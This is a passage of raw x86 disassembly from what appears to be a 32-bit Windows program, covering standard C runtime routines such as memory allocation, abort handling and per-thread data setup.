  403e65:	56                   	push   %esi
  403e66:	e8 cd 2a 00 00       	call   0x406938
  403e6b:	59                   	pop    %ecx
  403e6c:	85 c0                	test   %eax,%eax
  403e6e:	74 15                	je     0x403e85
  403e70:	56                   	push   %esi
  403e71:	6a 00                	push   $0x0
  403e73:	ff 35 60 42 41 00    	push   0x414260
  403e79:	ff 15 fc c0 40 00    	call   *0x40c0fc
  403e7f:	85 c0                	test   %eax,%eax
  403e81:	74 d9                	je     0x403e5c
  403e83:	eb 0d                	jmp    0x403e92
  403e85:	e8 b1 09 00 00       	call   0x40483b
  403e8a:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  403e90:	33 c0                	xor    %eax,%eax
  403e92:	5e                   	pop    %esi
  403e93:	5d                   	pop    %ebp
  403e94:	c3                   	ret
  403e95:	e8 20 2c 00 00       	call   0x406aba
  403e9a:	85 c0                	test   %eax,%eax
  403e9c:	74 08                	je     0x403ea6
  403e9e:	6a 16                	push   $0x16
  403ea0:	e8 70 2c 00 00       	call   0x406b15
  403ea5:	59                   	pop    %ecx
  403ea6:	f6 05 40 30 41 00 02 	testb  $0x2,0x413040
  403ead:	74 21                	je     0x403ed0
  403eaf:	6a 17                	push   $0x17
  403eb1:	e8 f6 69 00 00       	call   0x40a8ac
  403eb6:	85 c0                	test   %eax,%eax
  403eb8:	74 05                	je     0x403ebf
  403eba:	6a 07                	push   $0x7
  403ebc:	59                   	pop    %ecx
  403ebd:	cd 29                	int    $0x29
  403ebf:	6a 01                	push   $0x1
  403ec1:	68 15 00 00 40       	push   $0x40000015
  403ec6:	6a 03                	push   $0x3
  403ec8:	e8 ac 05 00 00       	call   0x404479
  403ecd:	83 c4 0c             	add    $0xc,%esp
  403ed0:	6a 03                	push   $0x3
  403ed2:	e8 e2 f7 ff ff       	call   0x4036b9
  403ed7:	cc                   	int3
  403ed8:	8b ff                	mov    %edi,%edi
  403eda:	55                   	push   %ebp
  403edb:	8b ec                	mov    %esp,%ebp
  403edd:	56                   	push   %esi
  403ede:	8b 75 08             	mov    0x8(%ebp),%esi
  403ee1:	85 f6                	test   %esi,%esi
  403ee3:	74 0c                	je     0x403ef1
  403ee5:	6a e0                	push   $0xffffffe0
  403ee7:	33 d2                	xor    %edx,%edx
  403ee9:	58                   	pop    %eax
  403eea:	f7 f6                	div    %esi
  403eec:	3b 45 0c             	cmp    0xc(%ebp),%eax
  403eef:	72 34                	jb     0x403f25
  403ef1:	0f af 75 0c          	imul   0xc(%ebp),%esi
  403ef5:	85 f6                	test   %esi,%esi
  403ef7:	75 17                	jne    0x403f10
  403ef9:	46                   	inc    %esi
  403efa:	eb 14                	jmp    0x403f10
  403efc:	e8 18 f9 ff ff       	call   0x403819
  403f01:	85 c0                	test   %eax,%eax
  403f03:	74 20                	je     0x403f25
  403f05:	56                   	push   %esi
  403f06:	e8 2d 2a 00 00       	call   0x406938
  403f0b:	59                   	pop    %ecx
  403f0c:	85 c0                	test   %eax,%eax
  403f0e:	74 15                	je     0x403f25
  403f10:	56                   	push   %esi
  403f11:	6a 08                	push   $0x8
  403f13:	ff 35 60 42 41 00    	push   0x414260
  403f19:	ff 15 fc c0 40 00    	call   *0x40c0fc
  403f1f:	85 c0                	test   %eax,%eax
  403f21:	74 d9                	je     0x403efc
  403f23:	eb 0d                	jmp    0x403f32
  403f25:	e8 11 09 00 00       	call   0x40483b
  403f2a:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  403f30:	33 c0                	xor    %eax,%eax
  403f32:	5e                   	pop    %esi
  403f33:	5d                   	pop    %ebp
  403f34:	c3                   	ret
  403f35:	8b ff                	mov    %edi,%edi
  403f37:	55                   	push   %ebp
  403f38:	8b ec                	mov    %esp,%ebp
  403f3a:	57                   	push   %edi
  403f3b:	8b f9                	mov    %ecx,%edi
  403f3d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403f40:	c6 47 0c 00          	movb   $0x0,0xc(%edi)
  403f44:	85 c9                	test   %ecx,%ecx
  403f46:	74 0a                	je     0x403f52
  403f48:	8b 01                	mov    (%ecx),%eax
  403f4a:	89 47 04             	mov    %eax,0x4(%edi)
  403f4d:	8b 41 04             	mov    0x4(%ecx),%eax
  403f50:	eb 16                	jmp    0x403f68
  403f52:	a1 d4 3d 41 00       	mov    0x413dd4,%eax
  403f57:	85 c0                	test   %eax,%eax
  403f59:	75 12                	jne    0x403f6d
  403f5b:	a1 30 36 41 00       	mov    0x413630,%eax
  403f60:	89 47 04             	mov    %eax,0x4(%edi)
  403f63:	a1 34 36 41 00       	mov    0x413634,%eax
  403f68:	89 47 08             	mov    %eax,0x8(%edi)
  403f6b:	eb 44                	jmp    0x403fb1
  403f6d:	56                   	push   %esi
  403f6e:	e8 b7 03 00 00       	call   0x40432a
  403f73:	8d 57 04             	lea    0x4(%edi),%edx
  403f76:	89 07                	mov    %eax,(%edi)
  403f78:	52                   	push   %edx
  403f79:	8d 77 08             	lea    0x8(%edi),%esi
  403f7c:	8b 48 4c             	mov    0x4c(%eax),%ecx
  403f7f:	89 0a                	mov    %ecx,(%edx)
  403f81:	8b 48 48             	mov    0x48(%eax),%ecx
  403f84:	50                   	push   %eax
  403f85:	89 0e                	mov    %ecx,(%esi)
  403f87:	e8 eb 32 00 00       	call   0x407277
  403f8c:	56                   	push   %esi
  403f8d:	ff 37                	push   (%edi)
  403f8f:	e8 10 33 00 00       	call   0x4072a4
  403f94:	8b 0f                	mov    (%edi),%ecx
  403f96:	83 c4 10             	add    $0x10,%esp
  403f99:	8b 81 50 03 00 00    	mov    0x350(%ecx),%eax
  403f9f:	5e                   	pop    %esi
  403fa0:	a8 02                	test   $0x2,%al
  403fa2:	75 0d                	jne    0x403fb1
  403fa4:	83 c8 02             	or     $0x2,%eax
  403fa7:	89 81 50 03 00 00    	mov    %eax,0x350(%ecx)
  403fad:	c6 47 0c 01          	movb   $0x1,0xc(%edi)
  403fb1:	8b c7                	mov    %edi,%eax
  403fb3:	5f                   	pop    %edi
  403fb4:	5d                   	pop    %ebp
  403fb5:	c2 04 00             	ret    $0x4
  403fb8:	6a 08                	push   $0x8
  403fba:	68 e8 17 41 00       	push   $0x4117e8
  403fbf:	e8 4c e1 ff ff       	call   0x402110
  403fc4:	8b 45 08             	mov    0x8(%ebp),%eax
  403fc7:	ff 30                	push   (%eax)
  403fc9:	e8 92 16 00 00       	call   0x405660
  403fce:	59                   	pop    %ecx
  403fcf:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403fd3:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403fd6:	8b 41 04             	mov    0x4(%ecx),%eax
  403fd9:	8b 00                	mov    (%eax),%eax
  403fdb:	ff 30                	push   (%eax)
  403fdd:	8b 01                	mov    (%ecx),%eax
  403fdf:	ff 30                	push   (%eax)
  403fe1:	e8 f9 02 00 00       	call   0x4042df
  403fe6:	59                   	pop    %ecx
  403fe7:	59                   	pop    %ecx
  403fe8:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403fef:	e8 08 00 00 00       	call   0x403ffc
  403ff4:	e8 5d e1 ff ff       	call   0x402156
  403ff9:	c2 0c 00             	ret    $0xc
  403ffc:	8b 45 10             	mov    0x10(%ebp),%eax
  403fff:	ff 30                	push   (%eax)
  404001:	e8 a2 16 00 00       	call   0x4056a8
  404006:	59                   	pop    %ecx
  404007:	c3                   	ret
  404008:	6a 08                	push   $0x8
  40400a:	68 08 18 41 00       	push   $0x411808
  40400f:	e8 fc e0 ff ff       	call   0x402110
  404014:	8b 45 08             	mov    0x8(%ebp),%eax
  404017:	ff 30                	push   (%eax)
  404019:	e8 42 16 00 00       	call   0x405660
  40401e:	59                   	pop    %ecx
  40401f:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404023:	8b 45 0c             	mov    0xc(%ebp),%eax
  404026:	8b 00                	mov    (%eax),%eax
  404028:	8b 00                	mov    (%eax),%eax
  40402a:	8b 48 48             	mov    0x48(%eax),%ecx
  40402d:	85 c9                	test   %ecx,%ecx
  40402f:	74 18                	je     0x404049
  404031:	83 c8 ff             	or     $0xffffffff,%eax
  404034:	f0 0f c1 01          	lock xadd %eax,(%ecx)
  404038:	75 0f                	jne    0x404049
  40403a:	81 f9 50 33 41 00    	cmp    $0x413350,%ecx
  404040:	74 07                	je     0x404049
  404042:	51                   	push   %ecx
  404043:	e8 c5 fd ff ff       	call   0x403e0d
  404048:	59                   	pop    %ecx
  404049:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404050:	e8 08 00 00 00       	call   0x40405d
  404055:	e8 fc e0 ff ff       	call   0x402156
  40405a:	c2 0c 00             	ret    $0xc
  40405d:	8b 45 10             	mov    0x10(%ebp),%eax
  404060:	ff 30                	push   (%eax)
  404062:	e8 41 16 00 00       	call   0x4056a8
  404067:	59                   	pop    %ecx
  404068:	c3                   	ret
  404069:	6a 08                	push   $0x8
  40406b:	68 28 18 41 00       	push   $0x411828
  404070:	e8 9b e0 ff ff       	call   0x402110
  404075:	8b 45 08             	mov    0x8(%ebp),%eax
  404078:	ff 30                	push   (%eax)
  40407a:	e8 e1 15 00 00       	call   0x405660
  40407f:	59                   	pop    %ecx
  404080:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404084:	6a 00                	push   $0x0
  404086:	8b 45 0c             	mov    0xc(%ebp),%eax
  404089:	8b 00                	mov    (%eax),%eax
  40408b:	ff 30                	push   (%eax)
  40408d:	e8 4d 02 00 00       	call   0x4042df
  404092:	59                   	pop    %ecx
  404093:	59                   	pop    %ecx
  404094:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40409b:	e8 08 00 00 00       	call   0x4040a8
  4040a0:	e8 b1 e0 ff ff       	call   0x402156
  4040a5:	c2 0c 00             	ret    $0xc
  4040a8:	8b 45 10             	mov    0x10(%ebp),%eax
  4040ab:	ff 30                	push   (%eax)
  4040ad:	e8 f6 15 00 00       	call   0x4056a8
  4040b2:	59                   	pop    %ecx
  4040b3:	c3                   	ret
  4040b4:	6a 08                	push   $0x8
  4040b6:	68 c8 17 41 00       	push   $0x4117c8
  4040bb:	e8 50 e0 ff ff       	call   0x402110
  4040c0:	8b 45 08             	mov    0x8(%ebp),%eax
  4040c3:	ff 30                	push   (%eax)
  4040c5:	e8 96 15 00 00       	call   0x405660
  4040ca:	59                   	pop    %ecx
  4040cb:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4040cf:	8b 45 0c             	mov    0xc(%ebp),%eax
  4040d2:	8b 00                	mov    (%eax),%eax
  4040d4:	8b 00                	mov    (%eax),%eax
  4040d6:	8b 40 48             	mov    0x48(%eax),%eax
  4040d9:	f0 ff 00             	lock incl (%eax)
  4040dc:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4040e3:	e8 08 00 00 00       	call   0x4040f0
  4040e8:	e8 69 e0 ff ff       	call   0x402156
  4040ed:	c2 0c 00             	ret    $0xc
  4040f0:	8b 45 10             	mov    0x10(%ebp),%eax
  4040f3:	ff 30                	push   (%eax)
  4040f5:	e8 ae 15 00 00       	call   0x4056a8
  4040fa:	59                   	pop    %ecx
  4040fb:	c3                   	ret
  4040fc:	8b ff                	mov    %edi,%edi
  4040fe:	55                   	push   %ebp
  4040ff:	8b ec                	mov    %esp,%ebp
  404101:	83 ec 0c             	sub    $0xc,%esp
  404104:	8b 45 08             	mov    0x8(%ebp),%eax
  404107:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  40410a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40410d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404110:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404113:	50                   	push   %eax
  404114:	ff 75 0c             	push   0xc(%ebp)
  404117:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40411a:	50                   	push   %eax
  40411b:	e8 e8 fe ff ff       	call   0x404008
  404120:	8b e5                	mov    %ebp,%esp
  404122:	5d                   	pop    %ebp
  404123:	c3                   	ret
  404124:	8b ff                	mov    %edi,%edi
  404126:	55                   	push   %ebp
  404127:	8b ec                	mov    %esp,%ebp
  404129:	83 ec 0c             	sub    $0xc,%esp
  40412c:	8b 45 08             	mov    0x8(%ebp),%eax
  40412f:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  404132:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404135:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404138:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40413b:	50                   	push   %eax
  40413c:	ff 75 0c             	push   0xc(%ebp)
  40413f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404142:	50                   	push   %eax
  404143:	e8 70 fe ff ff       	call   0x403fb8
  404148:	8b e5                	mov    %ebp,%esp
  40414a:	5d                   	pop    %ebp
  40414b:	c3                   	ret
  40414c:	8b ff                	mov    %edi,%edi
  40414e:	55                   	push   %ebp
  40414f:	8b ec                	mov    %esp,%ebp
  404151:	83 ec 0c             	sub    $0xc,%esp
  404154:	8b 45 08             	mov    0x8(%ebp),%eax
  404157:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  40415a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40415d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404160:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404163:	50                   	push   %eax
  404164:	ff 75 0c             	push   0xc(%ebp)
  404167:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40416a:	50                   	push   %eax
  40416b:	e8 f9 fe ff ff       	call   0x404069
  404170:	8b e5                	mov    %ebp,%esp
  404172:	5d                   	pop    %ebp
  404173:	c3                   	ret
  404174:	8b ff                	mov    %edi,%edi
  404176:	55                   	push   %ebp
  404177:	8b ec                	mov    %esp,%ebp
  404179:	83 ec 0c             	sub    $0xc,%esp
  40417c:	8b 45 08             	mov    0x8(%ebp),%eax
  40417f:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  404182:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404185:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404188:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40418b:	50                   	push   %eax
  40418c:	ff 75 0c             	push   0xc(%ebp)
  40418f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404192:	50                   	push   %eax
  404193:	e8 1c ff ff ff       	call   0x4040b4
  404198:	8b e5                	mov    %ebp,%esp
  40419a:	5d                   	pop    %ebp
  40419b:	c3                   	ret
  40419c:	8b ff                	mov    %edi,%edi
  40419e:	55                   	push   %ebp
  40419f:	8b ec                	mov    %esp,%ebp
  4041a1:	51                   	push   %ecx
  4041a2:	51                   	push   %ecx
  4041a3:	8b 45 08             	mov    0x8(%ebp),%eax
  4041a6:	33 c9                	xor    %ecx,%ecx
  4041a8:	41                   	inc    %ecx
  4041a9:	6a 43                	push   $0x43
  4041ab:	89 48 18             	mov    %ecx,0x18(%eax)
  4041ae:	8b 45 08             	mov    0x8(%ebp),%eax
  4041b1:	c7 00 30 ca 40 00    	movl   $0x40ca30,(%eax)
  4041b7:	8b 45 08             	mov    0x8(%ebp),%eax
  4041ba:	89 88 50 03 00 00    	mov    %ecx,0x350(%eax)
  4041c0:	8b 45 08             	mov    0x8(%ebp),%eax
  4041c3:	59                   	pop    %ecx
  4041c4:	c7 40 48 50 33 41 00 	movl   $0x413350,0x48(%eax)
  4041cb:	8b 45 08             	mov    0x8(%ebp),%eax
  4041ce:	66 89 48 6c          	mov    %cx,0x6c(%eax)
  4041d2:	8b 45 08             	mov    0x8(%ebp),%eax
  4041d5:	66 89 88 72 01 00 00 	mov    %cx,0x172(%eax)
  4041dc:	8b 45 08             	mov    0x8(%ebp),%eax
  4041df:	83 a0 4c 03 00 00 00 	andl   $0x0,0x34c(%eax)
  4041e6:	8d 45 08             	lea    0x8(%ebp),%eax
  4041e9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4041ec:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4041ef:	50                   	push   %eax
  4041f0:	6a 05                	push   $0x5
  4041f2:	e8 7d ff ff ff       	call   0x404174
  4041f7:	8d 45 08             	lea    0x8(%ebp),%eax
  4041fa:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4041fd:	8d 45 0c             	lea    0xc(%ebp),%eax
  404200:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404203:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404206:	50                   	push   %eax
  404207:	6a 04                	push   $0x4
  404209:	e8 16 ff ff ff       	call   0x404124
  40420e:	83 c4 10             	add    $0x10,%esp
  404211:	8b e5                	mov    %ebp,%esp
  404213:	5d                   	pop    %ebp
  404214:	c3                   	ret
  404215:	8b ff                	mov    %edi,%edi
  404217:	55                   	push   %ebp
  404218:	8b ec                	mov    %esp,%ebp
  40421a:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40421e:	74 12                	je     0x404232
  404220:	ff 75 08             	push   0x8(%ebp)
  404223:	e8 0e 00 00 00       	call   0x404236
  404228:	ff 75 08             	push   0x8(%ebp)
  40422b:	e8 dd fb ff ff       	call   0x403e0d
  404230:	59                   	pop    %ecx
  404231:	59                   	pop    %ecx
  404232:	5d                   	pop    %ebp
  404233:	c2 04 00             	ret    $0x4
  404236:	8b ff                	mov    %edi,%edi
  404238:	55                   	push   %ebp
  404239:	8b ec                	mov    %esp,%ebp
  40423b:	51                   	push   %ecx
  40423c:	8b 45 08             	mov    0x8(%ebp),%eax
  40423f:	8b 08                	mov    (%eax),%ecx
  404241:	81 f9 30 ca 40 00    	cmp    $0x40ca30,%ecx
  404247:	74 0a                	je     0x404253
  404249:	51                   	push   %ecx
  40424a:	e8 be fb ff ff       	call   0x403e0d
  40424f:	8b 45 08             	mov    0x8(%ebp),%eax
  404252:	59                   	pop    %ecx
  404253:	ff 70 3c             	push   0x3c(%eax)
  404256:	e8 b2 fb ff ff       	call   0x403e0d
  40425b:	8b 45 08             	mov    0x8(%ebp),%eax
  40425e:	ff 70 30             	push   0x30(%eax)
  404261:	e8 a7 fb ff ff       	call   0x403e0d
  404266:	8b 45 08             	mov    0x8(%ebp),%eax
  404269:	ff 70 34             	push   0x34(%eax)
  40426c:	e8 9c fb ff ff       	call   0x403e0d
  404271:	8b 45 08             	mov    0x8(%ebp),%eax
  404274:	ff 70 38             	push   0x38(%eax)
  404277:	e8 91 fb ff ff       	call   0x403e0d
  40427c:	8b 45 08             	mov    0x8(%ebp),%eax
  40427f:	ff 70 28             	push   0x28(%eax)
  404282:	e8 86 fb ff ff       	call   0x403e0d
  404287:	8b 45 08             	mov    0x8(%ebp),%eax
  40428a:	ff 70 2c             	push   0x2c(%eax)
  40428d:	e8 7b fb ff ff       	call   0x403e0d
  404292:	8b 45 08             	mov    0x8(%ebp),%eax
  404295:	ff 70 40             	push   0x40(%eax)
  404298:	e8 70 fb ff ff       	call   0x403e0d
  40429d:	8b 45 08             	mov    0x8(%ebp),%eax
  4042a0:	ff 70 44             	push   0x44(%eax)
  4042a3:	e8 65 fb ff ff       	call   0x403e0d
  4042a8:	8b 45 08             	mov    0x8(%ebp),%eax
  4042ab:	ff b0 60 03 00 00    	push   0x360(%eax)
  4042b1:	e8 57 fb ff ff       	call   0x403e0d
  4042b6:	8d 45 08             	lea    0x8(%ebp),%eax
  4042b9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4042bc:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4042bf:	50                   	push   %eax
  4042c0:	6a 05                	push   $0x5
  4042c2:	e8 35 fe ff ff       	call   0x4040fc
  4042c7:	8d 45 08             	lea    0x8(%ebp),%eax
  4042ca:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4042cd:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4042d0:	50                   	push   %eax
  4042d1:	6a 04                	push   $0x4
  4042d3:	e8 74 fe ff ff       	call   0x40414c
  4042d8:	83 c4 34             	add    $0x34,%esp
  4042db:	8b e5                	mov    %ebp,%esp
  4042dd:	5d                   	pop    %ebp
  4042de:	c3                   	ret
  4042df:	8b ff                	mov    %edi,%edi
  4042e1:	55                   	push   %ebp
  4042e2:	8b ec                	mov    %esp,%ebp
  4042e4:	56                   	push   %esi
  4042e5:	8b 75 08             	mov    0x8(%ebp),%esi
  4042e8:	83 7e 4c 00          	cmpl   $0x0,0x4c(%esi)
  4042ec:	74 28                	je     0x404316
  4042ee:	ff 76 4c             	push   0x4c(%esi)
  4042f1:	e8 52 23 00 00       	call   0x406648
  4042f6:	8b 46 4c             	mov    0x4c(%esi),%eax
  4042f9:	59                   	pop    %ecx
  4042fa:	3b 05 54 42 41 00    	cmp    0x414254,%eax
  404300:	74 14                	je     0x404316
  404302:	3d 78 35 41 00       	cmp    $0x413578,%eax
  404307:	74 0d                	je     0x404316
  404309:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  40430d:	75 07                	jne    0x404316
  40430f:	50                   	push   %eax
  404310:	e8 67 21 00 00       	call   0x40647c
  404315:	59                   	pop    %ecx
  404316:	8b 45 0c             	mov    0xc(%ebp),%eax
  404319:	89 46 4c             	mov    %eax,0x4c(%esi)
  40431c:	5e                   	pop    %esi
  40431d:	85 c0                	test   %eax,%eax
  40431f:	74 07                	je     0x404328
  404321:	50                   	push   %eax
  404322:	e8 d8 20 00 00       	call   0x4063ff
  404327:	59                   	pop    %ecx
  404328:	5d                   	pop    %ebp
  404329:	c3                   	ret
  40432a:	8b ff                	mov    %edi,%edi
  40432c:	56                   	push   %esi
  40432d:	57                   	push   %edi
  40432e:	ff 15 a8 c0 40 00    	call   *0x40c0a8
  404334:	8b f0                	mov    %eax,%esi
  404336:	a1 44 30 41 00       	mov    0x413044,%eax
  40433b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40433e:	74 0c                	je     0x40434c
  404340:	50                   	push   %eax
  404341:	e8 3c 15 00 00       	call   0x405882
  404346:	8b f8                	mov    %eax,%edi
  404348:	85 ff                	test   %edi,%edi
  40434a:	75 49                	jne    0x404395
  40434c:	68 64 03 00 00       	push   $0x364
  404351:	6a 01                	push   $0x1
  404353:	e8 80 fb ff ff       	call   0x403ed8
  404358:	8b f8                	mov    %eax,%edi
  40435a:	59                   	pop    %ecx
  40435b:	59                   	pop    %ecx
  40435c:	85 ff                	test   %edi,%edi
  40435e:	75 09                	jne    0x404369
  404360:	50                   	push   %eax
  404361:	e8 a7 fa ff ff       	call   0x403e0d
  404366:	59                   	pop    %ecx
  404367:	eb 38                	jmp    0x4043a1
  404369:	57                   	push   %edi
  40436a:	ff 35 44 30 41 00    	push   0x413044
  404370:	e8 63 15 00 00       	call   0x4058d8
  404375:	85 c0                	test   %eax,%eax
  404377:	75 03                	jne    0x40437c
  404379:	57                   	push   %edi
  40437a:	eb e5                	jmp    0x404361
  40437c:	68 54 42 41 00       	push   $0x414254
  404381:	57                   	push   %edi
  404382:	e8 15 fe ff ff       	call   0x40419c
  404387:	6a 00                	push   $0x0
  404389:	e8 7f fa ff ff       	call   0x403e0d
  40438e:	83 c4 0c             	add    $0xc,%esp
  404391:	85 ff                	test   %edi,%edi
  404393:	74 0c                	je     0x4043a1
  404395:	56                   	push   %esi
  404396:	ff 15 ac c0 40 00    	call   *0x40c0ac
  40439c:	8b c7                	mov    %edi,%eax
  40439e:	5f                   	pop    %edi
  40439f:	5e                   	pop    %esi
  4043a0:	c3                   	ret
  4043a1:	56                   	push   %esi
  4043a2:	ff 15 ac c0 40 00    	call   *0x40c0ac
  4043a8:	e8 e8 fa ff ff       	call   0x403e95
  4043ad:	cc                   	int3
  4043ae:	8b ff                	mov    %edi,%edi
  4043b0:	53                   	push   %ebx
  4043b1:	56                   	push   %esi
  4043b2:	57                   	push   %edi
  4043b3:	ff 15 a8 c0 40 00    	call   *0x40c0a8
  4043b9:	8b f0                	mov    %eax,%esi
  4043bb:	33 db                	xor    %ebx,%ebx
  4043bd:	a1 44 30 41 00       	mov    0x413044,%eax
  4043c2:	83 f8 ff             	cmp    $0xffffffff,%eax
  4043c5:	74 0c                	je     0x4043d3
  4043c7:	50                   	push   %eax
  4043c8:	e8 b5 14 00 00       	call   0x405882
  4043cd:	8b f8                	mov    %eax,%edi
  4043cf:	85 ff                	test   %edi,%edi
  4043d1:	75 51                	jne    0x404424
  4043d3:	68 64 03 00 00       	push   $0x364
  4043d8:	6a 01                	push   $0x1
  4043da:	e8 f9 fa ff ff       	call   0x403ed8
  4043df:	8b f8                	mov    %eax,%edi
  4043e1:	59                   	pop    %ecx
  4043e2:	59                   	pop    %ecx
  4043e3:	85 ff                	test   %edi,%edi
  4043e5:	75 09                	jne    0x4043f0
  4043e7:	53                   	push   %ebx
  4043e8:	e8 20 fa ff ff       	call   0x403e0d
  4043ed:	59                   	pop    %ecx
  4043ee:	eb 2b                	jmp    0x40441b
  4043f0:	57                   	push   %edi
  4043f1:	ff 35 44 30 41 00    	push   0x413044
  4043f7:	e8 dc 14 00 00       	call   0x4058d8
  4043fc:	85 c0                	test   %eax,%eax
  4043fe:	75 03                	jne    0x404403
  404400:	57                   	push   %edi
  404401:	eb e5                	jmp    0x4043e8
  404403:	68 54 42 41 00       	push   $0x414254
  404408:	57                   	push   %edi
  404409:	e8 8e fd ff ff       	call   0x40419c
  40440e:	53                   	push   %ebx
  40440f:	e8 f9 f9 ff ff       	call   0x403e0d
  404414:	83 c4 0c             	add    $0xc,%esp
  404417:	85 ff                	test   %edi,%edi
  404419:	75 09                	jne    0x404424
  40441b:	56                   	push   %esi
  40441c:	ff 15 ac c0 40 00    	call   *0x40c0ac
  404422:	eb 09                	jmp    0x40442d
  404424:	56                   	push   %esi
  404425:	ff 15 ac c0 40 00    	call   *0x40c0ac
  40442b:	8b df                	mov    %edi,%ebx
  40442d:	5f                   	pop    %edi
  40442e:	5e                   	pop    %esi
  40442f:	8b c3                	mov    %ebx,%eax
  404431:	5b                   	pop    %ebx
  404432:	c3                   	ret
  404433:	68 15 42 40 00       	push   $0x404215
  404438:	e8 99 13 00 00       	call   0x4057d6
  40443d:	a3 44 30 41 00       	mov    %eax,0x413044
  404442:	83 f8 ff             	cmp    $0xffffffff,%eax
  404445:	75 03                	jne    0x40444a
  404447:	32 c0                	xor    %al,%al
  404449:	c3                   	ret
  40444a:	e8 5f ff ff ff       	call   0x4043ae
  40444f:	85 c0                	test   %eax,%eax
  404451:	75 09                	jne    0x40445c
  404453:	50                   	push   %eax
  404454:	e8 06 00 00 00       	call   0x40445f
  404459:	59                   	pop    %ecx
  40445a:	eb eb                	jmp    0x404447
  40445c:	b0 01                	mov    $0x1,%al
  40445e:	c3                   	ret
  40445f:	a1 44 30 41 00       	mov    0x413044,%eax
  404464:	83 f8 ff             	cmp    $0xffffffff,%eax
  404467:	74 0d                	je     0x404476
  404469:	50                   	push   %eax
  40446a:	e8 bd 13 00 00       	call   0x40582c
  40446f:	83 0d 44 30 41 00 ff 	orl    $0xffffffff,0x413044
  404476:	b0 01                	mov    $0x1,%al
  404478:	c3                   	ret
  404479:	8b ff                	mov    %edi,%edi
  40447b:	55                   	push   %ebp
  40447c:	8b ec                	mov    %esp,%ebp
  40447e:	81 ec 28 03 00 00    	sub    $0x328,%esp
  404484:	a1 04 30 41 00       	mov    0x413004,%eax
  404489:	33 c5                	xor    %ebp,%eax
  40448b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40448e:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  404492:	57                   	push   %edi
  404493:	74 09                	je     0x40449e
  404495:	ff 75 08             	push   0x8(%ebp)
  404498:	e8 0b dc ff ff       	call   0x4020a8
  40449d:	59                   	pop    %ecx
  40449e:	6a 50                	push   $0x50
  4044a0:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  4044a6:	6a 00                	push   $0x0
  4044a8:	50                   	push   %eax
  4044a9:	e8 62 e0 ff ff       	call   0x402510
  4044ae:	68 cc 02 00 00       	push   $0x2cc
  4044b3:	8d 85 30 fd ff ff    	lea    -0x2d0(%ebp),%eax
  4044b9:	6a 00                	push   $0x0
  4044bb:	50                   	push   %eax
  4044bc:	e8 4f e0 ff ff       	call   0x402510
  4044c1:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  4044c7:	83 c4 18             	add    $0x18,%esp
  4044ca:	89 85 d8 fc ff ff    	mov    %eax,-0x328(%ebp)
  4044d0:	8d 85 30 fd ff ff    	lea    -0x2d0(%ebp),%eax
  4044d6:	89 85 dc fc ff ff    	mov    %eax,-0x324(%ebp)
  4044dc:	89 85 e0 fd ff ff    	mov    %eax,-0x220(%ebp)
  4044e2:	89 8d dc fd ff ff    	mov    %ecx,-0x224(%ebp)
  4044e8:	89 95 d8 fd ff ff    	mov    %edx,-0x228(%ebp)
  4044ee:	89 9d d4 fd ff ff    	mov    %ebx,-0x22c(%ebp)
  4044f4:	89 b5 d0 fd ff ff    	mov    %esi,-0x230(%ebp)
  4044fa:	89 bd cc fd ff ff    	mov    %edi,-0x234(%ebp)
  404500:	66 8c 95 f8 fd ff ff 	data16 mov %ss,-0x208(%ebp)
  404507:	66 8c 8d ec fd ff ff 	data16 mov %cs,-0x214(%ebp)
  40450e:	66 8c 9d c8 fd ff ff 	data16 mov %ds,-0x238(%ebp)
  404515:	66 8c 85 c4 fd ff ff 	data16 mov %es,-0x23c(%ebp)
  40451c:	66 8c a5 c0 fd ff ff 	data16 mov %fs,-0x240(%ebp)
  404523:	66 8c ad bc fd ff ff 	data16 mov %gs,-0x244(%ebp)
  40452a:	9c                   	pushf
  40452b:	8f 85 f0 fd ff ff    	pop    -0x210(%ebp)
  404531:	8b 45 04             	mov    0x4(%ebp),%eax
